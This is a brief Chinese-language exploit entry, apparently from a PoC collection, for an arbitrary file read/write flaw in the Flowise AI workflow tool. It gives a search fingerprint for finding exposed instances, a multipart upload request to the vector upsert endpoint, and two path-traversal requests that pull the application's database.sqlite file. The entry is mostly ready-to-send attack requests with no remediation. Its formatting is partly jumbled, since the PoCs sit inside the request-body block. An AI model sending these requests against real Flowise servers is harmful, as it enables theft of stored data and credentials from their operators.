# Flowiseupsert存在任意文件读取漏洞

- **系统**：Flowiseupsert　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="Flowise"`
- **请求**：`POST /api/v1/vector/upsert/ HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk…`　`Content-Length: 172`

**请求体 / payload**
```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="files"; filename="?"
Content-Type: text/plain
------WebKitFormBoundary7MA4YWxkTrZu0gW--
Poc1
GET /api/v1/get-upload-file?chatflowId=16842e75-9965-4529-8462-49528760dba8&chatId=../.././&fileName=database.sqlite HTTP/1.1
Host:
Poc2
POST /api/v1/openai-assistants-file/download HTTP/1.1
Host:
Content-Type: application/json
Content-Length: 100
{"chatflowId":"16842e75-9965-4529-8462-49528760dba8","chatId":"/../..","fileName":"database.sqlite"}
```
- **预期**：200　|　—